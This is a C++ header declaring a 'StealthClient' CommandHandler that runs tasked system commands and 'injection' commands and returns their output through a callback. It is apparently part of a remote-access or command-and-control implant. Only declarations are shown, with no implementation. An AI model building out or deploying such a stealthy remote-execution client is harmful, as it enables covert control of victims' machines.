#pragma once
#include <string>
#include <functional>
#include "core/injection.h"

namespace StealthClient {

class CommandHandler {
public:
    using OutputCallback = std::function<void(const std::string& taskId, const std::string& output, const std::string& status)>;

    CommandHandler();
    ~CommandHandler();

    void SetOutputCallback(OutputCallback callback);
    void ExecuteCommand(const std::string& taskId, const std::string& command);

private:
    std::string ExecuteSystemCommand(const std::string& command);
    std::string ExecuteInjectionCommand(const std::string& command);
    bool IsInjectionCommand(const std::string& command);
    
    AdvancedInjection m_injection;
    OutputCallback m_outputCallback;
};

} // namespace StealthClient
